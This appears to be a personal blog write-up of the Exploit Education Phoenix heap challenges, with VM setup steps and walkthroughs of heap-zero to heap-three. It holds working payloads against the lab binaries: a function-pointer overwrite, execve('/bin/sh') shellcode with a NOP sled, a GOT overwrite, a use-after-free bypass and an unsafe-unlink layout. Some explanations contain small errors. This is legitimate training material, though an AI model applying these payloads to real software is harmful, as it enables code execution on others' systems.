---
layout: phoenix
title: "Welcome to Jekyll!"
date: 2025-04-06 12:26:40 +0530
categories: jekyll update
---

---

#  Phoenix:

**Phoenix** is the first part of the binary exploitation learning series by [Exploit Education](https://exploit.education/).

---

##  Getting Started

You can download the Phoenix challenge files from the official page:

 [exploit.education/downloads](https://exploit.education/downloads/)

> ⚠️ At the time of writing, the prebuilt repo wasn’t available.
> So, I built the VM manually using QEMU — and I’ll show you how to do the same!

---

## For Windows Users

### 1. **Download the Image**

* Choose the `amd64` version (or whichever matches your architecture).
* Format: `.qcow2` image inside a `.zip` file.

### 2. **Extract & Navigate**

```bash
unzip phoenix-amd64.zip
cd phoenix-amd64/
```

### 3. **Install QEMU**

QEMU is required to emulate the VM.
For best compatibility, run it through **WSL (Windows Subsystem for Linux)**.

Install QEMU (on WSL):

```bash
sudo apt update && sudo apt install qemu-system-x86
```

---

### 4. **Launch the VM**

Run the following from the extracted image directory:

```bash
qemu-system-x86_64 \
  -m 512M \
  -kernel ./vmlinuz-4.9.0-8-amd64 \
  -initrd ./initrd.img-4.9.0-8-amd64 \
  -hda ./exploit-education-phoenix-amd64.qcow2 \
  -append "root=/dev/sda1 console=ttyS0" \
  -nographic
```

---

## Default Credentials

| Username | `user`   |
| -------- | -------- |
| Passowrd | `user`   |

---

## Accessing the Challenges

Once logged in:

```bash
cd /opt/phoenix/amd64
```

Replace `amd64` with your architecture if you're using a different one.

---

## You're In!

If everything worked, your terminal (via WSL) should show a login prompt and boot into the Phoenix VM. From here, you can start working on the binary exploitation challenges.

> Pro Tip: Use `tmux` or split terminals to keep debugger sessions, source code, and shell access visible at the same time.

---

<div class="image-row">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
</div>

---

# Heap-Zero:

**Challenge**: [Phoenix/Heap-Zero](https://exploit.education/phoenix/heap-zero/)

**Goal**: Overflow the buffer and change the value of the `changeme` variable using a **format string vulnerability**.

---

## Quick History

From [Wikipedia](https://en.wikipedia.org/wiki/Heap_overflow):

> *A heap overflow, heap overrun, or heap smashing is a type of `buffer overflow` that occurs in the heap data area. Heap overflows are exploitable in a different manner to that of stack-based overflows. Memory on the heap is dynamically allocated at runtime and typically contains program data. Exploitation is performed by corrupting this data in specific ways to cause the application to overwrite internal structures such as linked list `pointers`. The canonical heap overflow technique overwrites `dynamic memory allocation linkage` (such as `malloc` metadata) and uses the resulting pointer exchange to overwrite a program `function pointer`.*

⚡ **Takeaway**:  You can corrupt heap-managed metadata or adjacent `heap` data (like a function pointer) to change `program control flow`.

---

## Starting the Challenge

![binary-start](/assets/phoenix-heap/welcome.png)



At the start, we see:

```
data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x804884e
level has not been passed - function pointer has not been overwritten
```

Clearly, our mission is to *overflow* the`function pointer`. 🚩


nm ./heap-zero

```
08049068 t sYSTRIm
         U sbrk
0804c2c4 B stderr
0804c2c0 B stdout
         U strcpy
         U sysconf
0804a7b0 T valloc
08048835 T winner
```

we see a winner `08048835` function,

yes, this is the thing we need to call,

```
(gdb) disassemble winner
Dump of assembler code for function winner:
   0x08048835 <+0>:     push   %ebp
   0x08048836 <+1>:     mov    %esp,%ebp
   0x08048838 <+3>:     sub    $0x8,%esp
   0x0804883b <+6>:     sub    $0xc,%esp
   0x0804883e <+9>:     push   $0x804abd0
   0x08048843 <+14>:    call   0x8048600 <puts@plt>
   0x08048848 <+19>:    add    $0x10,%esp
   0x0804884b <+22>:    nop
   0x0804884c <+23>:    leave
   0x0804884d <+24>:    ret
End of assembler dump.
(gdb) x/s 0x804abd0
0x804abd0:      "Congratulations, you have passed this level"
(gdb)

```

---

## Strategy

Here, its calling some address `0x804abd0`, lets add some 72 bytes worth of buffer?

So, the disassembly will give us what code is exactly doing i.e. number of byte allocation in malloc,

We’ll need to:

* our base address is 0xf7e69008.
* our target address is 0xf7e69050.
* We need to just overflow it with 0x804abd0.
* substracting the address we get 72 bytes.
 

`payload` is like `72*A + 0x804abd0`

---
## Exploit

writing out our exploit:

```
./heap-zero "$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\x35\x88\x04\x08')")" 
```

![passed](/assets/phoenix-heap/passed.png)

---

## Injecting Shellcode

On amd64 we ran into problems with NUL (`\x00`) and newline (`\x0a`) bytes when trying to place raw addresses into argv. Important constraints:

* `argv[]` entries are C strings and **cannot contain NUL** bytes dur to `strcpy()`.
* Shell command substitution and quoting can be broken by newlines or unescaped bytes.

script:

```
import struct

address = struct.pack('Q',0x7fffffffeec1-20)

shellcode = (
    b"\x48\x31\xd2"
    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
    b"\x48\xc1\xeb\x08"
    b"\x53"
    b"\x48\x89\xe7"
    b"\x50"
    b"\x57"
    b"\x48\x89\xe6"
    b"\xb0\x3b"
    b"\x0f\x05"
)

length = 72 - len(shellcode)

print(b"\x90" * 8 + shellcode + b"A" * length + address)

```

Because of those constraints, you used a **shellcode injection + return address** approach on amd64.

---

## amd64 shellcode-style exploit (script used)

Replace the address with the exact address observed in gdb.

```python
#!/usr/bin/env python3
import struct

# pick the address you saw in gdb where the shellcode/buffer will reside
# example: 0x7fffffffeec1 - 20
address = struct.pack('Q', 0x7fffffffeec1 - 20)

shellcode = (
    b"\x48\x31\xd2"
    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
    b"\x48\xc1\xeb\x08"
    b"\x53"
    b"\x48\x89\xe7"
    b"\x50"
    b"\x57"
    b"\x48\x89\xe6"
    b"\xb0\x3b"
    b"\x0f\x05"
)

length = 72 - len(shellcode)

print(b"\x90" * 8 + shellcode + b"A" * length + address)
```

> Note: replace `0x7fffffffeec1-20` with the exact address you verified in gdb. In GDB I got buffer around 0xeec1 by observing sp and ip, I decremented the address by 20 bytes.

* NOP sled (0x90s)
* execve("/bin/sh") shellcode
* padding up to the saved RIP overwrite
* 8-byte little-endian return address (to jump into the NOP/shellcode area)

Write the payload to a file and use it in gdb:

```bash
python3 /tmp/qaz.py > /tmp/payload.bin
gdb --args ./heap-zero zero
# inside gdb:
(gdb) run < /tmp/payload.bin
```

Or, if the program opens the filename passed in argv:

```bash
./heap-zero $(python /tmp/qaz.py)
```
![alt text](/assets/phoenix-heap/image-2.png)

---

## Recommendations / debugging tips

* Use gdb to confirm layout:

  * `info registers rip rsp rbp`
  * `x/256bx <buffer_address>`
  * `x/4gx $rbp`       (view saved rbp and saved rip if frame pointers used)
  * `x/10i <buffer_address>` (disassemble where you will land)
  * `info proc mappings` (check NX/permissions)

* If you see decoder junk like `rex.X` when disassembling, it usually means you returned into ASCII bytes (`0x40`–`0x4f` are REX prefixes). Fix by placing a NOP sled (`0x90`) before the shellcode or ensure the return address points to a valid opcode.

* **Argv cannot contain NUL bytes.** To pass binary data with NULs use:

  * a temporary file and pass its filename
  * stdin (pipe or redirection)
  * process substitution (`/dev/fd/N`) or FIFO

* Use little-endian packing for addresses:

  * 32-bit: `struct.pack("<I", addr)`
  * 64-bit: `struct.pack("<Q", addr)`

* For realistic targets prefer ROP / ret2libc where NX is enabled. On this host `checksec` showed NX disabled and RWX segments present, which allowed stack/heap shellcode execution.

---
<div class="image-row">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
</div>
---

# Heap-One:

**Challenge**: [Phoenix/Heap-One](https://exploit.education/phoenix/heap-one/)

**Goal**: Overflow the heap and change the address of the `puts@got.plt` to  **winner address**.

---

## 📌 Quick Background

From **Wikipedia**:

> *A heap overflow, heap overrun, or heap smashing is a type of buffer overflow that occurs in the heap data area. Heap overflows are exploitable in a different manner to that of stack-based overflows. Memory on the heap is dynamically allocated at runtime and typically contains program data. Exploitation is performed by corrupting this data in specific ways to cause the application to overwrite internal structures such as linked list pointers. The canonical heap overflow technique overwrites dynamic memory allocation linkage (such as malloc metadata) and uses the resulting pointer exchange to overwrite a program function pointer.*

**⚡ Takeaway:**
Heap overflows allow corruption of heap metadata or adjacent heap chunks to change control flow — often via pointer overwrites.

---

##  Starting the Challenge

Running the binary:

```
$ ./heap-one
[ 2216.609667] heap-one[328]: segfault at 0 ip 00000000f7f840f1 sp 00000000ffffdd14 error 4 in libc.so[f7f6d000+8d000]
Segmentation fault
```

Testing with larger arguments (64 bytes):

```
[ 2192.364105] heap-one[327]: segfault at 0 ip 00000000f7f840d6 sp 00000000ffffdcd4 error 4 in libc.so[f7f6d000+8d000]

```

Different values appear for `ip` and `sp`, but the program still crashes — a clear sign something interesting is happening on the heap.

---

## 🔧 Inspecting the Binary

```
nm ./heap-one
```

We discover:

```
0804889a T winner
```

Let’s inspect this function:

```gdb
(gdb) disassemble winner
```

```asm
0x0804889a <+0>:   push   %ebp
0x080488a3 <+9>:   push   $0x0
0x080488a5 <+11>:  call   time
0x080488b1 <+23>:  push   $msg
0x080488b6 <+28>:  call   printf
```

And the message:

```gdb
(gdb) x/s 0x804ab8c
"Congratulations, you've completed this level..."
```

So our goal is to redirect code execution to `winner()`.

---

## Understanding the Program (C Source)

```c
struct heapStructure {
  int priority;
  char *name;
};

int main(int argc, char **argv) {
  struct heapStructure *i1, *i2;

  i1 = malloc(sizeof(struct heapStructure));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct heapStructure));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

### 📌 Observations

* Both `name` pointers are allocated using `malloc(8)` → **small, adjacent heap chunks**.
* `strcpy()` copies user input **without bounds checking**.
* Overflowing `i1->name` will overwrite heap metadata **or the fields of `i2`**.
* After both `strcpy()` calls, the program calls:

```c
printf("and that's a wrap folks!\n");
```

### ⚡ GOT Overwrite Idea

We can overwrite a **Global Offset Table (GOT)** entry: specifically the one for `puts`, which is later called by `printf` internally.

We cant here realistically do stack smashing or anything else due to fact we have vulnerabilty surrounding heap area and stack region or eip of main is very far from heap region.

The structure:

Replace:

```
puts@got = address_of(winner)
```

When the program tries to call `puts()`, it will execute `winner()` instead.

---

## Inspecting the GOT Entry for puts()

```gdb
(gdb) x/10i 0x80485b0
```

We find:

```
0x804c140 <puts@got.plt>: 0x80485b6
```

And the winner function:

```
winner @ 0x0804889a
```

If we set:

```gdb
set {int}0x804c140 = 0x804889a
```

the program prints the winning message.

This confirms our target.

---

## Locating the Heap Chunks

Set a breakpoint after the second `strcpy()`:

```
b *0x08048878
run AAAAAAAA BBBBBBBB
```

Inspect registers:

```
   0x08048871 <+156>:   push   edx
   0x08048872 <+157>:   push   eax
   0x08048873 <+158>:   call   0x8048560 <strcpy@plt>
```

the edx here is the source or arg value (in disassembly we would see environment variables, other good stuff)

and eax is actual heap pointer to i1->name and i2->name (1st strcpy@plt and 2nd strcpy@plt)


```
eax = i2->name  (destination of second strcpy)
```

Dump around that region:

```
x/40wx $eax-40
```

Output:

```
0xf7e69010:     0x00000000      0x00000011      0x41414141      0x41414141
0xf7e69020:     0x00000000      0x00000011      0x00000002      0xf7e69038
0xf7e69030:     0x00000000      0x00000011      0x42424242      0x42424242
0xf7e69040:     0x00000000      0x000fffc1      0x00000000      0x00000000
0xf7e69050:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69060:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69070:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69080:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69090:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690a0:     0x00000000      0x00000000      0x00000000      0x00000000

```

The distance between `i1->name` and `i2->name` is:

```python
hex(0xf7e69038 - 0xf7e69018) == '0x20'
```

So overflowing `i1->name` by **20 bytes** lets us overwrite the pointer stored in `i2->name`.

That gives us full control over the **destination pointer** used by the second `strcpy()`.

---

## Final Exploit Strategy

1. `argv[1]` overflows `i1->name`
   → overwrite `i2->name` with the address of **puts@got**.

2. `argv[2]` becomes the *source* for the second `strcpy()`
   → copied **into the GOT entry**.

3. Payload #2 = address of `winner()`.

### Final Payload

```bash
./heap-one \
$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\x40\xc1\x04\x08")') \
$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x9a\x88\x04\x08")')
```

* `b"A"*20` — padding up to overwrite point
* `b"\x40\xc1\x04\x08"` — `puts@got.plt`
* `b"\x9a\x88\x04\x08"` — `winner()`

---

## Result

Running the exploit:

```
Congratulations, you've completed this level @ 1763272634 seconds past the Epoch
```

Heap overflow → GOT overwrite → control-flow hijack → `winner()` executed!

---

<div class="image-row">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
</div>

---

# Heap-Two:

**Challenge:** [Heap-Two](https://exploit.education/phoenix/heap-two/)

**Goal:** Turn the use-after-free on the `auth struct` into a login bypass by making `auth->auth` **non-zero**.

---

## Overview

**Type:** *Use-After-Free (UAF)* of a global pointer (`struct auth *auth` stored in `.bss`).

**Primitive:** Overwrite `auth->auth` by forcing `strdup()` to reallocate the freed chunk and copy controlled bytes into it.

**Win condition:** If:

```c
if (auth && auth->auth)
    printf("you have logged in already!");
```

→ we need **auth to remain non-NULL** (dangling pointer) and `auth->auth != 0`.

### ⚡ Takeaway 
Heap misuse (especially reuse of freed chunks) allows corruption of struct fields or heap metadata to change control flow: even without direct overflow.

---

## Starting the Challenge

Running the challenge gives:

```
Welcome to phoenix/heap-two, brought to you by https://exploit.education
[ auth = 0, service = 0 ]
```

Something about `auth` and `service`.

Looking at the source code, there's an interesting struct:

```c
struct auth {
    char name[32];
    int auth;
};

struct auth *auth;
char *service;
```

And:

### Where is `auth` used?

Login check:

```c
if (strncmp(line, "login", 5) == 0) {
    if (auth && auth->auth) {
        printf("you have logged in already!\n");
    } else {
        printf("please enter your password\n");
    }
}
```

So the condition requires:

* `auth != NULL`
* `auth->auth != 0`

Since the pointer isn’t cleared after `free()`, the pointer still exists, and the memory may be reused later: perfect **UAF**.

```c
if (strncmp(line, "reset", 5) == 0) {
    free(auth);
}
```

> The pointer `auth` is freed, but not set to `NULL`.

*This is key.*


## Why not overflow the struct directly?

Because:

```c
if (strlen(line + 5) < 31) {
    strcpy(auth->name, line + 5);
}
```

We cannot overflow `name`: input is restricted to **< 31 bytes**.

So we need another path and that’s `service`.

---
## Why does `free()` help us?


`free()` makes that heap region **eligible for reuse**, placing it into bins depending on allocator logic.

Then later:

```c
if (strncmp(line, "service", 6) == 0) {
    service = strdup(line + 7);
}
```

`strdup()` allocates memory **equal to the length of input** (no bounds check).

Since the freed `auth` chunk is the perfect size, the allocator often reuses it.

Meaning: the data we pass into `service` overwrites the old structure.

---

## Program Flow Summary

```
1. auth <name>
2. reset    → frees the struct, pointer still dangling
3. service <long payload> → strdup reuses freed chunk
4. login    → check passes because we overwrite auth->auth
```

To trigger overwrite, we need **31+ bytes**, because:

The service literally doesn't checks for any length (if it would have checked for length our attack vector service would have failed and we must have looked for something else)

Okay we need to input 32 bytes for the attack to succeed

Then call the auth!

```
auth idontwannadeadbeef
```

```
reset
```

```
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
```
login
```

* `name[32]`
* then `int auth` (4 bytes)

So:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0a\x00\
```

---

## GDB Walkthrough

Disassemble main and cross-check the source code and the disassembly of `main`

Disassembly of interest:

```assembly
0x00000000004008df <+130>:   call   0x400680 [malloc@plt](mailto:malloc@plt)
0x00000000004008e4 <+135>:   mov    QWORD PTR [rip+0x200525],rax        # 0x600e10 <auth>
0x00000000004008eb <+142>:   mov    rax,QWORD PTR [rip+0x20051e]        # 0x600e10 <auth>
0x00000000004008f2 <+149>:   mov    edx,0x24
0x00000000004008f7 <+154>:   mov    esi,0x0
0x00000000004008fc <+159>:   mov    rdi,rax
0x00000000004008ff <+162>:   call   0x4006b0 [memset@plt](mailto:memset@plt)
0x0000000000400904 <+167>:   lea    rax,[rbp-0x80]
0x0000000000400908 <+171>:   add    rax,0x5
0x000000000040090c <+175>:   mov    rdi,rax
0x000000000040090f <+178>:   call   0x4006d0 [strlen@plt](mailto:strlen@plt)
0x0000000000400914 <+183>:   cmp    rax,0x1e
0x0000000000400918 <+187>:   ja     0x400934 <main+215>
0x000000000040091a <+189>:   lea    rax,[rbp-0x80]
0x000000000040091e <+193>:   add    rax,0x5
0x0000000000400922 <+197>:   mov    rdx,QWORD PTR [rip+0x2004e7]        # 0x600e10 <auth>
0x0000000000400929 <+204>:   mov    rsi,rax
0x000000000040092c <+207>:   mov    rdi,rdx
0x000000000040092f <+210>:   call   0x400640 [strcpy@plt]
```

*This maps to the following source code:*

```
auth = malloc(sizeof(struct auth));
memset(auth, 0, sizeof(struct auth));
if (strlen(line + 5) < 31) {
strcpy(auth->name, line + 5);
}
```

These lines are interesting because this is the first place where we see where `auth` is located in the heap (heap address).


### Internal in GDB:

```
(gdb) b *  0x000000000040092f
Breakpoint 1 at 0x40092f
(gdb) run
Starting program: /opt/phoenix/amd64/heap-two
Welcome to phoenix/heap-two, brought to you by [https://exploit.education](https://exploit.education)
[ auth = 0, service = 0 ]
auth idontwantdeadbeef
```

```
Breakpoint 1, 0x000000000040092f in main ()
(gdb) info register
rax            0x7fffffffec05      140737488350213
rbx            0x7fffffffecd8      140737488350424
rcx            0x8080808080808080  -9187201950435737472
rdx            0x600e40            6295104
rsi            0x7fffffffec05      140737488350213
rdi            0x600e40            6295104
rbp            0x7fffffffec80      0x7fffffffec80
rsp            0x7fffffffebf0      0x7fffffffebf0
r8             0x7fffffffec05      140737488350213
```

```
(gdb) ni
0x0000000000400934 in main ()
(gdb) x/40bx $rdi
0x600e40:       0x69    0x64    0x6f    0x6e    0x74    0x77    0x61    0x6e
0x600e48:       0x74    0x64    0x65    0x61    0x64    0x62    0x65    0x65
0x600e50:       0x66    0x0a    0x00    0x00    0x00    0x00    0x00    0x00
0x600e58:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x600e60:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
```

```
(gdb) x/40s $rdi
0x600e40:       "idontwantdeadbeef\n"
0x600e53:       ""
0x600e54:       ""
```


Nice. Further in the disassembly, look at `free@plt()` first argument:

```
0x000000000040094e <+241>:   mov    0x2004bb(%rip),%rax        # 0x600e10 >
0x0000000000400955 <+248>:   mov    %rax,%rdi
0x0000000000400958 <+251>:   callq  0x4006e0 [free@plt](mailto:free@plt)

```

```
(gdb) x/5a 0x600e10
0x600e10 <auth>:        0x600e40        0x0
0x600e20:       0x0     0x0
0x600e30:       0x1
```

So from here, we confirm that the `auth` heap region starts at `0x600e40`.


### Reset the program and check again:

```
(gdb) x/30gx 0x600e40
0x600e40:       0x00007ffff7ffbb98      0x00007ffff7ffbb98
0x600e50:       0x0000000000000a66      0x0000000000000000
0x600e60:       0x0000000000000000      0x0000000000000000
0x600e70:       0x0000000000000041      0x0000000000000181
0x600e80:       0x00007ffff7ffbb68      0x00007ffff7ffbb68
```

```
(gdb) x/40a  0x00007ffff7ffbb68
0x7ffff7ffbb68 <mal+264>:       0x0     0x0
0x7ffff7ffbb78 <mal+280>:       0x7ffff7ffbb68 <mal+264>        0x7f>
0x7ffff7ffbb88 <mal+296>:       0x0     0x0
0x7ffff7ffbb98 <mal+312>:       0x0     0x0
0x7ffff7ffbba8 <mal+328>:       0x600e30        0x600e30
```

Now inspect after the service block `if` runs (set breakpoint there):

```
b *0x0000000000400987
```

Now send service input *31 times*:

```
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```
Breakpoint 3, 0x0000000000400987 in main ()
(gdb) x/30x 0x600e40
0x600e40:       0x4141414141414120      0x4141414141414141
0x600e50:       0x4141414141414141      0x4141414141414141
0x600e60:       0x000000000000000a      0x0000000000000000
0x600e70:       0x0000000000000041      0x0000000000000180
0x600e80:       0x00007ffff7ffbb68      0x00007ffff7ffbb68
```

Repeat:

```
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

```assembly
Breakpoint 3, 0x0000000000400987 in main ()
(gdb) x/30x 0x600e40
0x600e40:       0x4141414141414120      0x4141414141414141
0x600e50:       0x4141414141414141      0x4141414141414141
0x600e60:       0x000000000000000a      0x0000000000000000
0x600e70:       0x0000000000000041      0x0000000000000041
0x600e80:       0x4141414141414120      0x4141414141414141
0x600e90:       0x4141414141414141      0x4141414141414141
0x600ea0:       0x000000000000000a      0x0000000000000000
0x600eb0:       0x0000000000000041      0x0000000000000140
0x600ec0:       0x00007ffff7ffbb38      0x00007ffff7ffbb38
0x600ed0:       0x0000000000000000      0x0000000000000000
0x600ee0:       0x0000000000000000      0x0000000000000000
0x600ef0:       0x0000000000000000      0x0000000000000000
0x600f00:       0x0000000000000000      0x0000000000000000
0x600f10:       0x0000000000000000      0x0000000000000000
0x600f20:       0x0000000000000000      0x0000000000000000
```

```bash
(gdb) c
Continuing.
[ auth = 0x600e40, service = 0x600e40 ]
login
you have logged in already!

```

---

## Internals of the Exploit

This worked because:

* The pointer remained dangling.
* The freed chunk was reused by `strdup()`.
* We controlled the struct layout when memory was reallocated.

---

## Final Payload

```
auth idontwannadeadbeef
reset
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
login
```

---

###  Exploit success:

![alt text](/assets/phoenix-heap/hellooo.png)

---
<div class="image-row">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
  <img src="/assets/phoenix/section.png" class="my-special-class" alt="Elongated Image">
</div>
---

# Heap-Three:

**Challenge:** [Heap-Three](https://exploit.education/phoenix/heap-three/)

**Goal:** Redirect execution flow to **winner()** by corrupting heap metadata during `free()`.

---

## Overview

**Type:** *Heap metadata corruption* (unsafe unlink in dlmalloc)

**Primitive:** Control of `fd` / `bk` pointers in a free chunk, leading to an **arbitrary write** during consolidation.

**Win condition:** Overwrite a control-flow-sensitive pointer (e.g. `puts@GOT`) so that execution reaches `winner()`.

## ⚡ Takeaway

Old dlmalloc-based heaps **trust chunk metadata** during consolidation.
If an attacker controls that metadata, `free()` becomes a write primitive.

---

## Starting the Challenge

Running the binary:
Starting up the challenge we find ourselves hitting segfaults,

Opening disassembly its clear that the program uses three malloc and three frees

The strcpy is allocating var1, var2, var3 then de allocation is from var3 var2 var1 in that order

Nothing fancy, but looking at the binary reveals:

* three `malloc()` calls
* three `strcpy()` calls
* three `free()` calls
* a final `puts()`

---

## Program Flow (High-Level)

From disassembly of `main`:

```
malloc(0x20) → a
malloc(0x20) → b
malloc(0x20) → c

strcpy(a, argv[1])
strcpy(b, argv[2])
strcpy(c, argv[3])

free(c)
free(b)
free(a)

puts("dynamite failed?")

```
(gdb) c
Continuing.
dynamite failed?


Yeah, now what? nm the challenge we clearly have a winner() function how do we go there….?

Notice `puts()` how about changing its **GOT entry** to `winner()`?

```
Breakpoint 1, 0x080488b2 in main ()
(gdb) set *(unsigned int *) 0x804c13c = 0x080487d5
(gdb) c
Continuing.
Level was successfully completed at @ 1765868569 seconds past the Epoch
[Inferior 1 (process 304) exited normally]
```
Done! But how to do it outside gdb?

Is theres any way from heap we can jump?

---

## Why This Is Interesting

Key observations:

* `strcpy()` gives **unbounded writes**
* `free()` is called **in reverse order**
* Freed chunks are adjacent → **consolidation**
* The allocator is **dlmalloc**

This combination is exactly where classic heap metadata attacks live.

---

## Heap Chunk Refresher (Only What We Need)

So the heap layout is:

```
[A][B][C][wilderness]
```

With user-controlled data written into **all three chunks** before they are freed.

Each heap chunk looks like:

```
[ prev_size ]    ← only meaningful if previous chunk is free
[ size | flags ] ← always present
[ user data ]    ← attacker-controlled
```

If the chunk is free and placed into a doubly-linked bin:

```
[ fd ]
[ bk ]
```

These pointers are **written to and trusted** by the allocator.

---

## Observing the Heap in GDB

setting bp at after third malloc:

![malloc](/assets/phoenix-heap/disassemled.png)


The last bytes (`ff89` indicate rest of heap area meaning size of heap remaining which is called wilderness.)

At this point, we have allocated the chunks but we need to initialize.

Moving forward we need to now intialize these chunks-

```
(gdb) ni
0x08048882 in main ()
(gdb) x/80gwx 0xf7e69000
0xf7e69000:     0x00000000      0x00000029      0x41414141      0x41414141
0xf7e69010:     0x41414141      0x41414141      0x00000000      0x00000000
0xf7e69020:     0x00000000      0x00000000      0x00000000      0x00000029
0xf7e69030:     0x42424242      0x42424242      0x42424242      0x42424242
0xf7e69040:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69050:     0x00000000      0x00000029      0x43434343      0x43434343
0xf7e69060:     0x43434343      0x43434343      0x00000000      0x00000000
0xf7e69070:     0x00000000      0x00000000      0x00000000      0x000fff89
0xf7e69080:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69090:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690b0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690c0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690d0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690e0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690f0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69100:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69110:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69120:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69130:     0x00000000      0x00000000      0x00000000      0x00000000
```

And the heap now looks like this,

![forward pointer](/assets/phoenix-heap/fd.png)

Lets continue (c all the free)

We see after all free we dont see null or zero replacing the data but rather some value overwritten first bytes of user data.

They are _forward pointers._

`fd`   `bk`   `(rest untouched)`

Why dont we see `bk` here?

`free()` first takes a look at the current chunk, it sees if the **prev bit** is _set_ or _unset_ and forward chunk is free to use or not, if the conditions match it _unlinks_ create a larger chunk and if that chunk is greater than 80 bytes then it has `fd` and `bk` or else if its smaller than 80 it will just have `fd`.

## After `free()`

Continuing execution past all three `free()` calls:

* user data is **not cleared**
* metadata changes
* some freed chunks now contain pointers

---

## Why Only One Pointer?

Because not all bins are doubly linked.

In dlmalloc:

| Bin type            | Pointers  |
| ------------------- | --------- |
| fastbin             | `fd` only |
| smallbin / largebin | `fd + bk` |

Since the chunks are small (`0x20`), they initially go into **fastbins**.

That means:

* singly linked
* **no unlink yet**

---

## Where Things Get Dangerous

During `free()`, dlmalloc tries to **merge adjacent free chunks**.

Relevant logic (simplified):

```c
if (!prev_inuse(p)) {
    p = previous_chunk;
    unlink(p);
}
```

And `unlink()` is defined as:

```c
FD->bk = BK;
BK->fd = FD;
```

This assumes:

* `fd` and `bk` are valid
* metadata is not attacker-controlled

That assumption is false here.

---

## Why This Is Exploitable

If we can control:

* `size`
* `prev_size`
* `fd`
* `bk`

Then `unlink()` becomes:

> “write attacker-chosen values to attacker-chosen addresses”

This is the classic **unsafe unlink** primitive.

---

## Constraints

There is one major complication:

* input is copied using `strcpy()`
* NULL bytes terminate the write

So:

* direct pointer injection is restricted
* metadata forging must account for this

This heavily influences how sizes and pointers are constructed.

---

## Stopping Point

Here’s the plan how about changing the size of c to 64?


Why 0x64? Its greater than 80 bytes which means the free has to check it as fd and bk both moreover we setting inuse bit as 0 ? meaning previous chunk is free/ available to use => the free algorithm also checks inuse i.e. next if next chunk’s prev bit is set or not.


To consider the to free and consolidate i.e. to use unlink() method we need, set prev_inuse bit as 0 for chunk c and next chunk to c must set its prev_insue bit to zero (because the previous chunk of c will only trigger if and if only c itself is free to use or  available)


If a chunk is free to use, it checks its fd and bk pointers and check if its free to consolidate as one and unlink them accordingly

```c
     if (!prev_inuse(p)) {
        prevsize = p->prev_size;
        size += prevsize;
        p = chunk_at_offset(p, -((long) prevsize));
        unlink(p, bck, fwd);
      }
```
```assembly

(gdb) x/80wx 0xf7e69000
0xf7e69000:     0x00000000      0x00000029      0x41414141      0x41414141
0xf7e69010:     0x0487d5b8      0x00d0ff08      0x00000000      0x00000000
0xf7e69020:     0x00000000      0x00000000      0x00000000      0x00000029
0xf7e69030:     0x42424242      0x42424242      0x00000000      0x00000000
0xf7e69040:     0x00000000      0x00000011      0x0804c130      0xf7e69010
0xf7e69050:     0x00000010      0x00000064      0x43434343      0x41414141
0xf7e69060:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69070:     0x00000000      0x00000000      0x00000000      0x000fff89
0xf7e69080:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69090:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690b0:     0x00000000      0x00000000      0x00000010      0xf7e69080
0xf7e690c0:     0xf7e69090      0x00000000      0x00000011      0x00000000
0xf7e690d0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690e0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e690f0:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69100:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69110:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69120:     0x00000000      0x00000000      0x00000000      0x00000000
0xf7e69130:     0x00000000      0x00000000      0x00000000      0x00000000
(gdb) c
Continuing.


Breakpoint 2, 0x080488b2 in main ()
(gdb) c
